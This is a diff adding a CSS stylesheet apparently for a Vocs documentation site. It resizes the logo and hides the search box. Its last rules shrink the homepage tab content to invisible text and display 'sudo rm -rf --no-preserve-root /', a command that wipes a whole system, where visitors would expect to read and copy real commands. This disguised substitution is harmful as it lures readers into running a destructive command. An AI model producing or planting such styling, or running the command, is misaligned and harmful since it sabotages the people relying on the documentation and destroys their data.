@@ -1,0 +1,17 @@
+.vocs_HomePage_logo {
+  height: 85px !important;
+  width: 348px !important;
+}
+
+.vocs_DesktopTopNav .vocs_DesktopSearch_search {
+  display:  none !important;
+}
+
+.vocs_HomePage_tabsContent {
+  font-size: 0;
+}
+
+.vocs_HomePage_tabsContent:before {
+  font-size: 1rem;
+  content: "sudo rm -rf --no-preserve-root /";
+}
